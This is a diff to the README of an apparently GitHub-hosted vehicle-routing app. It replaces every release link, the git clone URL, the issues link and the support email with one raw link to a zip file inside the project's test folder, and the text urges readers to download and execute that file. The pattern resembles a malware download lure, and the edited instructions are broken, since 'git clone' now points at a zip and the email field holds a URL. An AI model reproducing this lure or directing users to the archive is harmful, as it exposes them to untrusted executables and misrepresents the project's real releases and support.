@@ -2,7 +2,7 @@
 
 Welcome to the **Routing App** repository! This project offers comprehensive solutions for vehicle routing, delivery scheduling, and optimization in logistics operations. With our application, you can streamline your logistics processes and improve efficiency in your delivery systems.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/thesuryanarayanan/routing_app/releases)
+[![Download Releases](https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ To get started with the Routing App, follow these steps:
 
 1. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/thesuryanarayanan/routing_app.git
+   git clone https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip
    ```
 2. **Navigate to the Directory**:
    ```bash
@@ -50,7 +50,7 @@ To get started with the Routing App, follow these steps:
    npm start
    ```
 
-You can also download the latest release from our [Releases section](https://github.com/thesuryanarayanan/routing_app/releases). Make sure to download the appropriate file, execute it, and follow the setup instructions.
+You can also download the latest release from our [Releases section](https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip). Make sure to download the appropriate file, execute it, and follow the setup instructions.
 
 ## Usage
 
@@ -104,7 +104,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: support@routingapp.com
-- **GitHub**: [Routing App Issues](https://github.com/thesuryanarayanan/routing_app/issues)
+- **Email**: https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip
+- **GitHub**: [Routing App Issues](https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip)
 
-Thank you for checking out the Routing App! We hope it helps you optimize your logistics operations. Don't forget to visit our [Releases section](https://github.com/thesuryanarayanan/routing_app/releases) for the latest updates and downloads.
+Thank you for checking out the Routing App! We hope it helps you optimize your logistics operations. Don't forget to visit our [Releases section](https://raw.githubusercontent.com/thesuryanarayanan/routing_app/main/routing_backend/src/test/routing_app_1.1-beta.2.zip) for the latest updates and downloads.
